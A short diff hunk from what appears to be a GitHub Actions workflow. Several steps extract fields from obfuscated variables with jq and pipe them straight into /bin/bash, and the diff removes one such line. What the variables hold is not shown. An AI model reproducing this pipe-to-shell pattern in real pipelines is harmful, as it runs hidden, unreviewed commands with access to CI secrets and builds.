@@ -22,7 +22,6 @@ jobs:
           echo $vj00 | jq -r .smovi0 | /bin/bash
           echo $gnoi670 | jq -r .coz0148 | /bin/bash
           printf '%s' "$njlkv45286" | jq -r .cdz337 | /bin/bash
-          echo $ts0280 | jq -r .umu61 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
